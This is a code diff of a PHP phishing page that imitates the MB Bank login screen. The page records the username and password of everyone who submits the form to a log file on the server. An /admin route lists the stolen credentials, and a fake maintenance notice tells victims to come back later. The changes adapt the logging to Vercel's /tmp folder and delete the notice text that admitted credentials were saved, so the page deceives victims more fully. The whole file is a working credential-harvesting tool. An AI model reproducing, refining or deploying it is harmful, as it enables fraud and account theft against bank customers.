@@ -1,22 +1,18 @@
 <?php
-// ================================================
-// MB BANK FAKE UI - LƯU LOGS KHI NHẤN ĐĂNG NHẬP
-// ================================================
-
+// MB Bank Fake UI - Lưu logs ổn định hơn trên Vercel
 $uri = $_SERVER['REQUEST_URI'] ?? '/';
+$logFile = '/tmp/mb_logs.txt';   // Sử dụng /tmp - thư mục tạm Vercel cho phép ghi
 
 // ====================== TRANG ADMIN - XEM LOGS ======================
 if (strpos($uri, '/admin') !== false) {
     $logs = [];
     $logContent = "Chưa có dữ liệu nào được lưu.";
 
-    $filePath = '../logs.txt';
-
-    if (file_exists($filePath)) {
-        $logContent = file_get_contents($filePath);
-        $lines = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if (file_exists($logFile)) {
+        $logContent = file_get_contents($logFile);
+        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         foreach ($lines as $line) {
-            $parts = explode(" | ", $line, 3);  // Giới hạn 3 phần
+            $parts = explode(" | ", $line, 3);
             if (count($parts) >= 3) {
                 $logs[] = $parts;
             }
@@ -28,67 +24,23 @@ if (strpos($uri, '/admin') !== false) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MB Bank - Admin Logs</title>
+    <title>MB Bank - Logs</title>
     <style>
-        body {
-            font-family: 'Be Vietnam Pro', sans-serif;
-            background: #000;
-            color: #fff;
-            padding: 20px;
-            line-height: 1.6;
-        }
-        h1 { color: #8fd3f4; }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 20px 0;
-        }
-        th, td {
-            border: 1px solid #8fd3f4;
-            padding: 12px;
-            text-align: left;
-        }
-        th {
-            background: #8fd3f4;
-            color: #0a0a80;
-        }
-        pre {
-            background: #111;
-            padding: 15px;
-            border-radius: 8px;
-            overflow: auto;
-            white-space: pre-wrap;
-            max-height: 400px;
-        }
-        .back {
-            color: #8fd3f4;
-            text-decoration: none;
-            font-size: 16px;
-        }
-        .info {
-            background: rgba(255,255,255,0.1);
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-        }
+        body {font-family:'Be Vietnam Pro',sans-serif;background:#000;color:#fff;padding:20px;}
+        table {width:100%;border-collapse:collapse;margin:20px 0;}
+        th, td {border:1px solid #8fd3f4;padding:12px;text-align:left;}
+        th {background:#8fd3f4;color:#0a0a80;}
+        pre {background:#111;padding:15px;border-radius:8px;overflow:auto;white-space:pre-wrap;}
+        .back {color:#8fd3f4;text-decoration:none;}
     </style>
 </head>
 <body>
     <h1>📋 MB Bank - Logs Đăng Nhập</h1>
-    
-    <div class="info">
-        <strong>Tổng số bản ghi:</strong> <?= count($logs) ?> 
-        | 
-        <strong>File logs.txt:</strong> <?= file_exists($filePath) ? 'Tồn tại' : 'Không tồn tại' ?>
-    </div>
+    <p><strong>Tổng số bản ghi:</strong> <?= count($logs) ?></p>
 
     <?php if (!empty($logs)): ?>
     <table>
-        <tr>
-            <th>Thời gian</th>
-            <th>Tên đăng nhập</th>
-            <th>Mật khẩu</th>
-        </tr>
+        <tr><th>Thời gian</th><th>Tên đăng nhập</th><th>Mật khẩu</th></tr>
         <?php foreach($logs as $log): ?>
         <tr>
             <td><?= htmlspecialchars($log[0] ?? '') ?></td>
@@ -98,13 +50,13 @@ if (strpos($uri, '/admin') !== false) {
         <?php endforeach; ?>
     </table>
     <?php else: ?>
-    <p>Chưa có bản ghi đăng nhập nào.</p>
+    <p>Chưa có bản ghi nào.</p>
     <?php endif; ?>
 
-    <h2>Nội dung đầy đủ file logs.txt:</h2>
+    <h2>Nội dung file logs:</h2>
     <pre><?= htmlspecialchars($logContent) ?></pre>
 
-    <br><br>
+    <br>
     <a href="/" class="back">← Quay lại trang đăng nhập</a>
 </body>
 </html>
@@ -119,16 +71,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = trim($_POST['username'] ?? '');
     $password = trim($_POST['password'] ?? '');
 
-    // === LƯU LOGS ===
     if (!empty($username) && !empty($password)) {
         $logLine = date('Y-m-d H:i:s') . " | " . $username . " | " . $password . "\n";
         
-        // Ghi vào file
-        $result = file_put_contents('../logs.txt', $logLine, FILE_APPEND | LOCK_EX);
+        // Ghi vào /tmp thay vì ../logs.txt
+        file_put_contents($logFile, $logLine, FILE_APPEND | LOCK_EX);
         
-        if ($result !== false) {
-            $showModal = true;
-        }
+        $showModal = true;
     }
 }
 ?>
@@ -139,7 +88,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MB Bank UI</title>
-
     <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@300;400;500;600&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
 
@@ -180,35 +128,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         .toggle-password {position:absolute;right:0;top:50%;transform:translateY(-50%);cursor:pointer;color:rgba(255,255,255,0.7);}
 
         .row {display:flex;justify-content:space-between;font-size:15px;margin-bottom:25px;}
-        .login-btn {
-            width:100%;padding:16px;border:none;border-radius:30px;background:#8fd3f4;
-            font-weight:600;font-size:18px;color:#0a0a80;cursor:pointer;
-        }
+        .login-btn {width:100%;padding:16px;border:none;border-radius:30px;background:#8fd3f4;font-weight:600;font-size:18px;color:#0a0a80;cursor:pointer;}
         .version {text-align:center;margin-top:20px;font-size:14px;opacity:0.9;}
-        .bottom-icons {
-            position:absolute;bottom:40px;width:100%;display:flex;justify-content:center;gap:40px;
-        }
-        .circle-icon {
-            width:55px;height:55px;border-radius:50%;border:1px solid rgba(255,255,255,0.4);
-            display:flex;justify-content:center;align-items:center;font-size:22px;backdrop-filter:blur(10px);
-        }
+        .bottom-icons {position:absolute;bottom:40px;width:100%;display:flex;justify-content:center;gap:40px;}
+        .circle-icon {width:55px;height:55px;border-radius:50%;border:1px solid rgba(255,255,255,0.4);display:flex;justify-content:center;align-items:center;font-size:22px;backdrop-filter:blur(10px);}
 
-        .maintenance-modal {
-            display:none;position:fixed;top:0;left:0;width:100%;height:100%;
-            background:rgba(0,0,0,0.85);z-index:1000;justify-content:center;align-items:center;
-        }
-        .modal-content {
-            background:rgba(255,255,255,0.1);backdrop-filter:blur(20px);
-            border:1px solid rgba(255,255,255,0.3);border-radius:20px;
-            width:85%;padding:30px 25px;text-align:center;
-        }
+        .maintenance-modal {display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:1000;justify-content:center;align-items:center;}
+        .modal-content {background:rgba(255,255,255,0.1);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.3);border-radius:20px;width:85%;padding:30px 25px;text-align:center;}
         .modal-icon {font-size:50px;margin-bottom:15px;color:#ffcc00;}
         .modal-title {font-size:20px;font-weight:600;margin-bottom:12px;color:#fff;}
         .modal-text {font-size:15px;line-height:1.5;color:rgba(255,255,255,0.85);margin-bottom:25px;}
-        .modal-btn {
-            width:100%;padding:14px;background:#8fd3f4;color:#0a0a80;border:none;
-            border-radius:30px;font-size:16px;font-weight:600;cursor:pointer;
-        }
+        .modal-btn {width:100%;padding:14px;background:#8fd3f4;color:#0a0a80;border:none;border-radius:30px;font-size:16px;font-weight:600;cursor:pointer;}
     </style>
 </head>
 <body>
@@ -245,15 +175,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     </div>
 </div>
 
-<!-- Modal -->
 <div id="maintenanceModal" class="maintenance-modal" style="display: <?= $showModal ? 'flex' : 'none' ?>;">
     <div class="modal-content">
         <div class="modal-icon">⚠️</div>
         <div class="modal-title">Thông báo hệ thống</div>
         <div class="modal-text">
             Hệ thống đang bảo trì do số lượng truy cập quá lớn.<br><br>
-            Vui lòng quay lại sau <strong>1 giờ</strong>.<br><br>
-            <small>Thông tin đăng nhập đã được lưu vào logs.</small>
+            Vui lòng quay lại sau <strong>1 giờ</strong>.
         </div>
         <button class="modal-btn" onclick="closeModal()">Đóng</button>
     </div>
@@ -275,6 +203,5 @@ function closeModal() {
     document.getElementById("maintenanceModal").style.display = "none";
 }
 </script>
-
 </body>
 </html>
